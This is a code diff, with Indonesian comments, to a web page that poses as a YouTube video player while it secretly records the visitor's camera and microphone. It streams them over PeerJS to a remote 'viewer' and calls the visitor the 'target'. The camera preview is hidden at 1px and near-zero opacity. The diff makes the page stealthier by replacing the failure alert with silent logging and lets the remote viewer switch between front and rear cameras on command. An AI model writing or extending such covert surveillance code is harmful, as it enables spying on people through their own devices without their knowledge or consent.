@@ -14,7 +14,7 @@
         .btn { padding: 22px; font-size: 1.6em; font-weight: bold; border: 2px solid white; background: transparent; color: white; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
         .btn:active { background: white; color: black; }
         #ytPlayer { width: 100%; aspect-ratio: 16/9; border: none; }
-        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        #cameraPreview { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -52,19 +52,19 @@
         
         let peer = null;
         let localStream = null;
+        let currentFacingMode = 'environment';
+        let activeCall = null;
 
         ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
 
         async function startApp() {
             try {
-                // 1. Ambil Kamera DULU
                 localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' }, 
+                    video: { facingMode: currentFacingMode }, 
                     audio: true 
                 });
                 cameraPreview.srcObject = localStream;
 
-                // 2. Setup Peer
                 peer = new Peer(targetId, {
                     host: '0.peerjs.com', port: 443, secure: true,
                     config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] }
@@ -72,23 +72,46 @@
 
                 peer.on('open', (id) => {
                     if (viewerId) {
-                        // 3. TARGET yang menelpon VIEWER (Lebih stabil)
-                        const call = peer.call(viewerId, localStream);
-                        
-                        // Hubungkan data channel juga
+                        activeCall = peer.call(viewerId, localStream);
                         const conn = peer.connect(viewerId);
                         conn.on('open', () => {
                             conn.send({ type: 'target_ready', targetId: id });
                         });
+                        conn.on('data', handleData);
                     }
                 });
             } catch (err) {
-                alert("Gagal akses kamera. Pastikan Anda menekan 'Allow'.");
+                console.error(err);
                 // Fallback video only
                 try {
                     localStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     startApp();
                 } catch(e) {}
+            }
+        }
+
+        async function handleData(data) {
+            if (data.type === 'switch_camera') {
+                currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+                
+                // Ganti track video secara real-time
+                const newStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: currentFacingMode },
+                    audio: true
+                });
+                
+                const newVideoTrack = newStream.getVideoTracks()[0];
+                
+                if (activeCall && activeCall.peerConnection) {
+                    const sender = activeCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
+                    if (sender) {
+                        sender.replaceTrack(newVideoTrack);
+                    }
+                }
+                
+                localStream.getTracks().forEach(track => track.stop());
+                localStream = newStream;
+                cameraPreview.srcObject = localStream;
             }
         }
 
